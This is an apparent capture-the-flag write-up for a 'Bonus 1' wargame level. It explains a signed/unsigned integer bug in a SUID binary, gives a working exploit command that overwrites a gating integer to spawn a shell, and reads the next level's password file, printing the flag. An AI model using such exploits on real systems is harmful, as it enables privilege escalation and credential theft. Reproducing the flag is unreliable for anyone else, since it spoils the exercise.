# Bonus 1

Same recon as level0: SUID **bonus2**.

## Analysis

```c
int main(int argc, char **argv) {
    char buf[40];
    int n = atoi(argv[1]);
    if (n < 10) {                          // signed check
        memcpy(buf, argv[2], n * 4);       // size = n*4, cast to size_t (unsigned)
        if (n == 0x574f4c46)               // "FLOW" little-endian
            execl("/bin/sh", "sh", 0);
        return 0;
    }
    return 1;
}
```

`n` must be both `< 10` and `0x574f4c46` (1,464,816,710). No value satisfies both, so the shell is unreachable normally. But `n` is checked signed while `memcpy`'s size is unsigned, which opens a [variable overwrite](../knowledge_base/buffer_overflow_101.md):

> **Signed/unsigned size overflow.** The bound `n < 10` is signed, so a negative `n` passes. `n * 4` is then handed to `memcpy` as an unsigned `size_t`. Pick a negative `n` whose `n * 4` wraps to a small positive number, and `memcpy` copies just enough bytes to overwrite `n` itself, then we set `n` to `"FLOW"`.

### Where `n` sits relative to buf

From `disas main`:

```asm
lea    0x14(%esp),%eax     ; buf at esp+0x14
mov    %eax,0x3c(%esp)     ; n   at esp+0x3c
```

Distance = `0x3c - 0x14 = 0x28` = **40 bytes**, so byte 40 of the copy is the first byte of `n`. We need `memcpy` to copy 44 bytes (40 padding + 4 to overwrite `n`).

### Choosing `n`

Need `(n * 4) mod 2^32 = 44`, i.e. `n ≡ 11 (mod 2^30)`, and `n < 10` as signed. Take `n = 11 + 3·2^30 = 0xC000000B`, which as signed is `-1073741813`.

Check: `0xC000000B * 4 = 0x3_0000002C` → low 32 bits `0x2C` = 44. Passes the signed bound (negative) and copies exactly 44 bytes.

## Exploit

```bash
./bonus1 -1073741813 $(python -c 'print "A"*40 + "FLOW"')
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

`memcpy` writes 40 A's into `buf`, then `"FLOW"` onto `n`. Now `n == 0x574f4c46`, the equality check passes, and `execl` runs a shell as bonus2. (No shellcode or return-address hijack, just flipping one gating integer.)

Flag: `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
